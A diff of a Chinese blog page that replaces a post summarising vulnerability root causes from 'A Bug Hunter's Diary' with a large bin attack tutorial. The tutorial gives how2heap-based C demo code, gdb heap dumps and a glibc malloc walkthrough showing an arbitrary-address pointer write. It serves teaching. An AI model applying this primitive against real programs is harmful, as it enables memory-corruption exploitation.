@@ -96,20 +96,21 @@
 
 
 
-  <meta name="description" content="前言最近阅读了捉虫日记这本少有的讲述漏洞挖掘方法的书籍，本书虽然只有7个漏洞，但是对每个漏洞到底是如何发现的做了很详细的说明，还原了漏洞挖掘的思维过程，笔者认为这是本书最有价值的一块内容，现在大部分的文章都是讲述了漏洞原理但是对于漏洞是如何发现的内容涉及很少。漏洞的发现过程是比较琐碎的，甚至难以回忆，很容易忘记当时的发现的思路历程，所以比较难成文，笔者也将努力将原书中我比较喜欢的几个漏洞的ROOT">
+  <meta name="description" content="large bin attack的作用例程1的作用就是任意地址写，但是写的内容不可控，所以只能用来修改global_max_fast这种作为一种中间步骤。 large bin attack 例程1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555">
 <meta property="og:type" content="article">
-<meta property="og:title" content="捉虫日记漏洞总结">
-<meta property="og:url" content="https://colorlight.github.io/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:title" content="堆利用系列六：Large Bin Attack ">
+<meta property="og:url" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/index.html">
 <meta property="og:site_name" content="Colorlight&#39;s Blog">
-<meta property="og:description" content="前言最近阅读了捉虫日记这本少有的讲述漏洞挖掘方法的书籍，本书虽然只有7个漏洞，但是对每个漏洞到底是如何发现的做了很详细的说明，还原了漏洞挖掘的思维过程，笔者认为这是本书最有价值的一块内容，现在大部分的文章都是讲述了漏洞原理但是对于漏洞是如何发现的内容涉及很少。漏洞的发现过程是比较琐碎的，甚至难以回忆，很容易忘记当时的发现的思路历程，所以比较难成文，笔者也将努力将原书中我比较喜欢的几个漏洞的ROOT">
+<meta property="og:description" content="large bin attack的作用例程1的作用就是任意地址写，但是写的内容不可控，所以只能用来修改global_max_fast这种作为一种中间步骤。 large bin attack 例程1123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2020-10-10T08:44:18.000Z">
-<meta property="article:modified_time" content="2020-10-10T09:39:39.311Z">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-06-03-18-49-11.png">
+<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-06-03-17-22-05.png">
+<meta property="article:published_time" content="2021-06-17T13:11:29.000Z">
+<meta property="article:modified_time" content="2021-06-17T13:27:07.372Z">
 <meta property="article:author" content="Colorlight">
-<meta property="article:tag" content="如何发现漏洞">
-<meta property="article:tag" content="ROOT CAUSE">
-<meta property="article:tag" content="Fuzz 变异策略">
+<meta property="article:tag" content="堆利用">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://colorlight.github.io/images/heap_exp/2021-06-03-18-49-11.png">
 
 
 
@@ -118,7 +119,7 @@
 
 
 
-  <link rel="canonical" href="https://colorlight.github.io/2020/10/10/捉虫日记漏洞总结/"/>
+  <link rel="canonical" href="https://colorlight.github.io/2021/06/17/堆利用系列之Large-Bin-Attack/"/>
 
 
 
@@ -128,7 +129,7 @@
   };
 </script>
 
-  <title>捉虫日记漏洞总结 | Colorlight's Blog</title>
+  <title>堆利用系列六：Large Bin Attack  | Colorlight's Blog</title>
   
 
 
@@ -405,7 +406,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://colorlight.github.io/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
+    <link itemprop="mainEntityOfPage" href="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/"/>
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Colorlight"/>
@@ -422,7 +423,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">捉虫日记漏洞总结
+          <h1 class="post-title" itemprop="name headline">堆利用系列六：Large Bin Attack 
 
               
             
@@ -448,7 +449,7 @@
                 
               
 
-              <time title="创建时间：2020-10-10 16:44:18" itemprop="dateCreated datePublished" datetime="2020-10-10T16:44:18+08:00">2020-10-10</time>
+              <time title="创建时间：2021-06-17 21:11:29" itemprop="dateCreated datePublished" datetime="2021-06-17T21:11:29+08:00">2021-06-17</time>
             
 
             
@@ -466,7 +467,7 @@
                 <span class="post-meta-item-text">分类于</span>
               
               
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">漏洞挖掘方法</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/" itemprop="url" rel="index"><span itemprop="name">堆利用</span></a></span>
 
                 
                 
@@ -485,8 +486,8 @@
                 </span>
             
                 <span class="post-meta-item-text">评论数：</span>
-                <a href="/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2020/10/10/%E6%8D%89%E8%99%AB%E6%97%A5%E8%AE%B0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" itemprop="commentCount"></span>
+                <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BLarge-Bin-Attack/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -514,50 +515,20 @@
       
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近阅读了捉虫日记这本少有的讲述漏洞挖掘方法的书籍，本书虽然只有7个漏洞，但是对每个漏洞到底是如何发现的做了很详细的说明，还原了漏洞挖掘的思维过程，笔者认为这是本书最有价值的一块内容，现在大部分的文章都是讲述了漏洞原理但是对于漏洞是如何发现的内容涉及很少。漏洞的发现过程是比较琐碎的，甚至难以回忆，很容易忘记当时的发现的思路历程，所以比较难成文，笔者也将努力将原书中我比较喜欢的几个漏洞的ROOT CAUSE和如何找到做一些简单的总结。</p>
-<h2 id="0x00-ESCAPE-FROM-WWW-ZONE漏洞"><a href="#0x00-ESCAPE-FROM-WWW-ZONE漏洞" class="headerlink" title="0x00 ESCAPE FROM WWW ZONE漏洞"></a>0x00 ESCAPE FROM WWW ZONE漏洞</h2><ul>
-<li><p>ROOT CAUSE<br>由于有错误条件是两个方式共同表示的，返回值和一个参数值，当出现错误条件的时候，只设置了其中一个条件（返回值）忘记设置了参数，由于对同一个错误状态的两种表达方式不同步，最终导致这个oob</p>
-</li>
-<li><p>如何发现这个漏洞</p>
-<ol>
-<li>观察错误条件是否是两个因素或者多个因素决定的，对于这种编程范式就可以好好审计</li>
-<li>构造好fuzz条件，fuzz 输入payload</li>
-</ol>
-</li>
-</ul>
-<h2 id="0x01-NULL-POINTER-FTW漏洞"><a href="#0x01-NULL-POINTER-FTW漏洞" class="headerlink" title="0x01 NULL POINTER FTW漏洞"></a>0x01 NULL POINTER FTW漏洞</h2><ul>
-<li><p>ROOT CAUSE<br>由于对长度信息的处理不恰当，将一个unsigned 类型直接赋值给 有符号的变量，对这个长度信息所做的任何判断大小比较都会存在风险。</p>
-</li>
-<li><p>如何发现这漏洞<br>对于TLV格式的数据，定位抽取长度的变量，观察这个变量是否赋给了有符号的变量，不需要对所有的类型转换进行审计，只需要对这种标识长度的变量的类型转换进行审计就行。这种有符号的比较大小本身就是容易出问题，有符号的比较就要考虑到小于0的情况</p>
-</li>
-<li><p>漏洞利用<br>造成的是NULL pointer derefernce，但是这个并不是制造成了dos，还造成了控制ip，由于这个空指针应用的偏移是可控的，所以可以落到got表中，对got表的修改，即可以在紧接着的call 目标got表函数时造成劫持</p>
-</li>
-</ul>
-<h2 id="0x02-ONE-KERNEL-TO-RULE-THEM-ALL-漏洞"><a href="#0x02-ONE-KERNEL-TO-RULE-THEM-ALL-漏洞" class="headerlink" title="0x02 ONE KERNEL TO RULE THEM ALL 漏洞"></a>0x02 ONE KERNEL TO RULE THEM ALL 漏洞</h2><ul>
-<li>ROOT CAUSE<br>memcpy函数的第一个参数是任意可变的，即使n是固定值，直接实现了write what where</li>
-<li>如何发现这个漏洞<ol>
-<li>作者还是通过跟踪数据流向的方法在静态的审计函数的处理流程，重点关注了与长度相关的处理逻辑，但是这个漏洞不需要dst与n的不同步即可触发，或者可以理解为是不同步的一种特殊情况，由于dst是任意的，所以永远与n不同步。</li>
-<li>除了仔细审计与长度相关的代码，还需要注意的是当涉及到与memcpy这种dst，src，和copy数目相关的函数的时候，一定要重点关注dst和num这两个值，要关注dst的来源是什么，是否和num同步，是否可能造成溢出，像这个漏洞是否dst是直接由用户指定的，这都是根据dst的来源而定的</li>
-</ol>
-</li>
-</ul>
-<h2 id="0x03-A-BUG-OLDER-THAN-4-4BSD-漏洞"><a href="#0x03-A-BUG-OLDER-THAN-4-4BSD-漏洞" class="headerlink" title="0x03 A BUG OLDER THAN 4.4BSD 漏洞"></a>0x03 A BUG OLDER THAN 4.4BSD 漏洞</h2><ul>
-<li>ROOT CAUSE<br>从payload中转化的长度信息，赋值给了有符号数，对有符号的比较，比较绕过，导致越界的访问</li>
-<li>如何发现这个漏洞<ol>
-<li>在追踪数据流的时候，不仅对数据的长度信息关注，还需要对任何数目相关的字段关注，这些字段的比较大小是容易出错的</li>
-<li>特别这些数目是有符号数的比较，是非常危险的，一定要注意小于0的情况是否是预期内的</li>
-</ol>
-</li>
-</ul>
-<h2 id="0x04-THE-RINGTONE-MASSACRE漏洞"><a href="#0x04-THE-RINGTONE-MASSACRE漏洞" class="headerlink" title="0x04 THE RINGTONE MASSACRE漏洞"></a>0x04 THE RINGTONE MASSACRE漏洞</h2><ul>
-<li>Fuzz方法<br>变异策略<ul>
-<li>通过对一个合法的文件格式进行逐个字节的0xff替换</li>
-<li>这种变异策略是相对高效的，可以找到一些简单的有关长度的漏洞，而且不需要对格式协议有详细的了解，smb也可以尝试利用同样的方法进行一些测试。</li>
-</ul>
-</li>
-</ul>
-<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文主要是对书中几个漏洞的根因进行了提炼，对根因的理解抽象才能够举一反三，所以漏洞原因也尽量精简，笔者也在整理漏洞挖掘方法，但是由于分析的漏洞数量不够多，还不好拿出分享，等到分析足够多的漏洞，到时会以makdown map的形式展示出。<br>以后也会经常以本篇文章的形式分析一系列漏洞。</p>
-<h2 id="版权声明"><a href="#版权声明" class="headerlink" title="版权声明"></a>版权声明</h2><p>本文作者为colorlight，转载请注明出处 <a href="https://colorlight.github.io">https://colorlight.github.io</a></p>
+        <h3 id="large-bin-attack的作用"><a href="#large-bin-attack的作用" class="headerlink" title="large bin attack的作用"></a>large bin attack的作用</h3><p>例程1的作用就是任意地址写，但是写的内容不可控，所以只能用来修改global_max_fast这种作为一种中间步骤。</p>
+<h3 id="large-bin-attack-例程1"><a href="#large-bin-attack-例程1" class="headerlink" title="large bin attack 例程1"></a>large bin attack 例程1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">// This is based off of Shellphish&apos;s how2heap: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/large_bin_attack.c</span><br><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;This will be covering large bin attacks.&quot;);</span><br><span class="line">    puts(&quot;They are similar to unsorted bin attacks, with that they let us write a pointer.&quot;);</span><br><span class="line">    puts(&quot;However like unsorted bin attacks, we can control where the pointer is written to, but not the value of the pointer.&quot;);</span><br><span class="line">    puts(&quot;Let&apos;s get started.\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long target = 0xdeadbeef;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Our goal will be to overwrite the target variable.\n&quot;);</span><br><span class="line">    printf(&quot;Target address:\t%p\n&quot;, &amp;target);</span><br><span class="line">    printf(&quot;Target value:\t0x%lx\n\n&quot;, target);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will start off by allocating six chunks.\n&quot;);</span><br><span class="line">    printf(&quot;Three of them will be big enough to go into the small/large bins.\n&quot;);</span><br><span class="line">    printf(&quot;The other three chunks will be fastbin size, to prevent consolidation between the large bin size chunks.\n&quot;);</span><br><span class="line"></span><br><span class="line">    unsigned long *ptr0, *ptr1, *ptr2;</span><br><span class="line">    unsigned long *fpt0, *fpt1, *fpt2;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr0 = malloc(0x200);</span><br><span class="line">    fpt0 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    ptr1 = malloc(0x500);</span><br><span class="line">    fpt1 = malloc(0x10);</span><br><span class="line">    </span><br><span class="line">    ptr2 = malloc(0x500);</span><br><span class="line">    fpt2 = malloc(0x10);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we have allocated our chunks.\n&quot;);</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Large Chunk0:\t%p\n&quot;, ptr0);</span><br><span class="line">    printf(&quot;Large Chunk1:\t%p\n&quot;, ptr1);</span><br><span class="line">    printf(&quot;Large Chunk2:\t%p\n&quot;, ptr2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Small Chunk0:\t%p\n&quot;, fpt0);</span><br><span class="line">    printf(&quot;Small Chunk1:\t%p\n&quot;, fpt1);</span><br><span class="line">    printf(&quot;Small Chunk2:\t%p\n\n&quot;, fpt2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now we will free the first two large chunks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr0);</span><br><span class="line">    free(ptr1);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Now they are both in the unsorted bin.\n&quot;);</span><br><span class="line">    printf(&quot;Since large bin sized chunks are inserted into the unsorted bin, before being moved to the large bin for potential reuse before they are thrown into that bin.\n&quot;);</span><br><span class="line">    printf(&quot;We will now allocate a fastbin sized chunk. This will move our second (larger) chunk into the large bin (since it is the larger chunk in the unsorted bin).\n&quot;);</span><br><span class="line">    printf(&quot;The first (smaller) chunk will have part of it&apos;s space used for the allocation, and then the remaining chunk will be inserted into the unsorted bin.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    malloc(0x10);  //--------------------&gt;b1</span><br><span class="line"></span><br><span class="line">    printf(&quot;Next up we will insert the third large chunk into the unsorted bin by freeing it.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr2);   //---------------------&gt;b2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    printf(&quot;Now here is where the bug comes in.\n&quot;);  //-------------------------&gt;b3</span><br><span class="line">    printf(&quot;We will need a bug that will allow us to edit the second chunk (the one that is in the unsorted bin).\n&quot;);</span><br><span class="line">    printf(&quot;Like with the unsorted bin attack, the bk pointer controls where our write goes to.\n&quot;);</span><br><span class="line">    printf(&quot;We will also need to zero out the fwd pointer.\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[0] = 0;</span><br><span class="line">    ptr1[1] = (unsigned long)((&amp;target) - 0x2);</span><br><span class="line"></span><br><span class="line">    printf(&quot;We will also need to overwrite it&apos;s size values with a smaller value.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    ptr1[-1] = 0x300;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Proceeding that we will allocate another small chunk.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The larger chunk (third chunk) in the unsorted bin will be inserted into the large bin.\n&quot;);</span><br><span class="line">    printf(&quot;However since the large bin is organized by size, the biggest chunk has to be first.\n&quot;);</span><br><span class="line">    printf(&quot;Since we overwrote the size of the second chunk with a smaller size, the third chunk will move up and become the front of the large bin.\n&quot;);</span><br><span class="line">    printf(&quot;This is where our write happens.\n\n&quot;);	</span><br><span class="line"></span><br><span class="line">    malloc(0x10);  //-------------------------&gt;b4</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we can see that the value of the target is:\n&quot;);  //----------------------&gt;b5</span><br><span class="line">    printf(&quot;Target value:\t0x%lx\n&quot;, target);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在b1地方下断点，观察内存情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &apos;*0x7ffff7dd1b20&apos; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758640, bk=0x555555758410</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)   →   Chunk(addr=0x555555758420, size=0x210, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></p>
+<p>由于free的时候，会把不是fastbin的chunk放到unsorted bin上，所以这个时候会有两个chunk在unsorted bin上。 </p>
+<p>在malloc(0x10)之后，会导致0x510的chunk被会回收到了large bin上，同时也会把0x210的chunk回收到smallbin上，但是由于申请的空间0x10+0x10是小于large bin的大小的，因此还是会从small bin chunk上找空间，就又从这个0x210的small chunk上分走了0x20大小的chunk，然后剩下的chunk被放入到了unsorted bin上。对应的源码为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">static void *</span><br><span class="line">_int_malloc (mstate av, size_t bytes)</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">        while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) </span><br><span class="line">        &#123;</span><br><span class="line">            bck = victim-&gt;bk;</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            unsorted_chunks (av)-&gt;bk = bck;    //一定会把chunk从unsorted bin上给删去的</span><br><span class="line">            bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            ...</span><br><span class="line"></span><br><span class="line">            mark_bin (av, victim_index);</span><br><span class="line">            victim-&gt;bk = bck;</span><br><span class="line">            victim-&gt;fd = fwd;</span><br><span class="line">            fwd-&gt;bk = victim;</span><br><span class="line">            bck-&gt;fd = victim;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">         if (!in_smallbin_range (nb))&#123;</span><br><span class="line">             ....  // 如果申请的大小是large chunk，则从large bin中返回chunk给用户</span><br><span class="line">             return p;</span><br><span class="line">         &#125;</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line">        //走到这里就已经是说明申请的大小是小于large bin chunk的了</span><br><span class="line"></span><br><span class="line">         remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">        /* We cannot assume the unsorted list is empty and therefore</span><br><span class="line">            have to perform a complete insert here.  */</span><br><span class="line">        bck = unsorted_chunks (av);     // 把从smallbin中分割剩下的remainder放到unsorted bin上。</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        if (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = &quot;malloc(): corrupted unsorted chunks 2&quot;;</span><br><span class="line">            goto errout;</span><br><span class="line">        &#125;</span><br><span class="line">        remainder-&gt;bk = bck;</span><br><span class="line">        remainder-&gt;fd = fwd;</span><br><span class="line">        bck-&gt;fd = remainder;</span><br><span class="line">        fwd-&gt;bk = remainder;</span><br></pre></td></tr></table></figure></p>
+<p>观察b2断点处的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">───────────────────────────── Unsorted Bin for arena &apos;*0x7ffff7dd1b20&apos; ─────────────────────────────</span><br><span class="line">[+] unsorted_bins[0]: fw=0x555555758430, bk=0x555555758430</span><br><span class="line"> →   Chunk(addr=0x555555758440, size=0x1f0, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br><span class="line">────────────────────────────── Small Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────────────── Large Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────</span><br><span class="line">[+] large_bins[67]: fw=0x555555758640, bk=0x555555758640</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure></p>
+<p>unsorted bin上就是从0x210的分下来的。</p>
+<p>观察b3断点的情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x555555758b70, bk=0x555555758430</span><br><span class="line"> →   Chunk(addr=0x555555758b80, size=0x510, flags=PREV_INUSE)   →   Chunk(addr=0x555555758440, size=0x1f0, flags=PREV_INUSE)</span><br><span class="line">[+] Found 2 chunks in unsorted bin.</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── Small Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] Found 0 chunks in 0 small non-empty bins.</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────── Large Bins for arena &apos;*0x7ffff7dd1b20&apos; ──────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">[+] large_bins[67]: fw=0x555555758640, bk=0x555555758640</span><br><span class="line"> →   Chunk(addr=0x555555758650, size=0x510, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in 1 large non-empty bins.</span><br></pre></td></tr></table></figure></p>
+<p>unsorted bin上被新增一个free的0x510的chunk，并且放到了头部。</p>
+<p>接着的利用一个溢出漏洞，修改ptr1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ptr1[0] = 0;</span><br><span class="line">ptr1[1] = (unsigned long)((&amp;target) - 0x2);</span><br><span class="line">ptr1[-1] = 0x300;</span><br></pre></td></tr></table></figure></p>
+<p>这个是为了后续进行给target修改值做准备。最后通过malloc(0x10)来触发对target的改写。</p>
+<p>下面简单说一下最后一个malloc(0x10)的时候，libc到底干了些什么事情<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1. 首先会判断这个0x10是符合fastbin的，但是fastbin是空的</span><br><span class="line">2. 所以尝试在smallbin上寻找，但是smallbin上也是空的 </span><br><span class="line">3. 这时候才尝试在unsortedbin上遍历chunk，遍历的方式是从尾部向头部遍历，先取出来unsortedbin尾部的chunk之后开始进行操作</span><br><span class="line">4. 先判断申请的大小是否符合small chunk， 是否是只有一个chunk在unsorted bin，由于我们有两个chunk所以这个不满足，所以不会进入尝试使用last remainder的逻辑</span><br><span class="line">5. 尝试把这个尾部的unsorted bin从链上给取下来</span><br><span class="line">6. 再判断我们的申请的chunk的size和当前这个chunk的size是否相等，如果相等就直接把当前这个chunk返回给用户,我们的申请的是0x20大小的，与现有的unsorted bin上的chunk都不符合，所以也不会执行这个流程</span><br><span class="line">7. 把他们回收到各自的bin上，注意到这里已经不用考虑分配的事情了，它最终会把unsroted bin给遍历一遍然后把剩下的0x1f0和0x510的chunk回收到各自的small bin和large bin上</span><br><span class="line">8. 回收完毕后，再考虑分配0x20的事情</span><br><span class="line">9. 会先看是不是large request，由于这是个small request，所以不执行这个流程</span><br><span class="line">10. 之后就是在small bin上进行best fit搜索，就是找可用的最小可用的，我们显然在small bin上只能找到0x1f0这个chunk，所以就在这个chunk上分配</span><br><span class="line">11. 把0x1f0这个chunk继续分割，头部的返回给用户，剩下的放到unsorted bin上，所以这个时候unsorted bin只剩下0x1d0(0x1f0 - 0x20)</span><br><span class="line"></span><br><span class="line">注意第7步，往large bin上回收的时候会触发我们的large bin attack，就是往我们指定的地址上开始写值。</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/heap_exp/2021-06-03-18-49-11.png" alt></p>
+<h3 id="large-bin的分配和释放"><a href="#large-bin的分配和释放" class="headerlink" title="large bin的分配和释放"></a>large bin的分配和释放</h3><p><img src="/images/heap_exp/2021-06-03-17-22-05.png" alt></p>
 
       
     </div>
@@ -581,11 +552,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E5%A6%82%E4%BD%95%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E/" rel="tag"># 如何发现漏洞</a>
-          
-            <a href="/tags/ROOT-CAUSE/" rel="tag"># ROOT CAUSE</a>
-          
-            <a href="/tags/Fuzz-%E5%8F%98%E5%BC%82%E7%AD%96%E7%95%A5/" rel="tag"># Fuzz 变异策略</a>
+            <a href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag"># 堆利用</a>
           
         </div>
       
@@ -598,8 +565,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/07/29/%E4%BC%AA%E9%80%A0LTE%E5%9C%B0%E9%9C%87%E6%B5%B7%E5%95%B8%E8%AD%A6%E6%8A%A5/" rel="next" title="伪造LTE地震海啸警报">
-                <i class="fa fa-chevron-left"></i> 伪造LTE地震海啸警报
+              <a href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BUnsorted-Bin-Attack/" rel="next" title="堆利用系列五：Unsorted Bin Attack ">
+                <i class="fa fa-chevron-left"></i> 堆利用系列五：Unsorted Bin Attack 
               </a>
             
           </div>
@@ -608,8 +575,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
